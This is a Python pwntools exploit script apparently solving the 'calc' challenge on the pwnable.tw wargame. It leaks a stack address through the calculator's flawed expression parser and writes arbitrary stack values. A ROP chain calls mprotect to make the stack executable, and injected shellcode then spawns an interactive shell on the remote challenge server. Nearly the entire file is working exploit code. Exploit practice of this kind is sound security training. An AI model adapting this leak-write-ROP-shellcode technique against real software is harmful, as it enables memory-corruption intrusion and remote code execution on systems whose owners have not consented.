#!/usr/bin/env python3
import pwn

# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF('../calc')

# Run this python script inside tmux like this:
# $> tmux
# $> ./exploit GDB
# It will spawn a separate window with the GDB session
pwn.context.terminal = ["tmux", "splitw", "-h"]

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# Just before returning from calc
break *0x08049433
break mprotect
continue
'''.format(**locals())


main_ret_address_offset = 361  # Offset where return address from the call to calc is stored
esp_placed_at_offset = 400  # At this offset, ESP was pushed to the stack


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif pwn.args.LOCAL:
        return pwn.process([exe.path] + argv, *a, **kw)
    else:
        return pwn.remote('chall.pwnable.tw', 10100)


def read_stack_offset(offset):
    assert offset > 0
    io.send(str(offset) + '+00\n')
    signed = int(io.recvline())
    unsigned = signed % 2**32
    return unsigned


def get_absolute_stack_address_below_main():
    offset = read_stack_offset(esp_placed_at_offset)
    pwn.success("Read offset: 0x%08x" % offset)
    return offset - (esp_placed_at_offset - main_ret_address_offset) * 4


def write_stack_offset(offset, value):
    assert offset > 0
    assert value > 0
    assert value != 0
    if value >= 2**31:
        # This is a negative value and cannot
        # be written directly
        # Instead, write 1 to the offset,
        # then subtract such that value is obtained
        # This does destroy the value offset + 1
        write_stack_offset(offset, 1)
        val = 2 ** 32 - value + 1
        assert 0 < val < 2**31
        io.send(str(offset + 1) + '*00-' + str(val) + '\n')
    else:
        # Value is in range 0 < value < 2**31
        # Just write the value directly
        io.send(str(offset) + '*' + '00%' + str(value) + '\n')
    io.recvline()


def write_rop_chain_to_addr(addr, rop_chain):
    assert len(rop_chain) % 4 == 0
    for x in range(0, int(len(rop_chain)/4)):
        val = rop_chain[x*4:(x + 1)*4]
        val = pwn.u32(val)
        write_stack_offset(x + addr, val)


mprotect_addr = exe.symbols['mprotect']

io = start()
io.recvuntil("=== Welcome to SECPROG calculator ===\n")
stack_addr = get_absolute_stack_address_below_main()
stack_addr_mod_pagesize = stack_addr - (stack_addr % 4096)
pwn.success("Stack absolute address is 0x%08x" % stack_addr)
pwn.success("Stack absolute address mod pagesize is 0x%08x" % stack_addr_mod_pagesize)
rop_chain = (
    pwn.p32(mprotect_addr) +            # return from calc, go to mprotect
    pwn.p32(stack_addr + 16) +          # return address after mprotect, go to shellcode
    pwn.p32(stack_addr_mod_pagesize) +  # mprotect param: addr
    pwn.p32(4096) +                     # mprotect param: page size
    pwn.p32(7) +                        # mprotect param: rwx
    pwn.asm(pwn.shellcraft.sh())        # shellcode after stack has been marked executable
)

pwn.debug("ROP chain:\n%s" % pwn.hexdump(rop_chain))

write_rop_chain_to_addr(main_ret_address_offset, rop_chain)
io.sendline()
io.interactive()
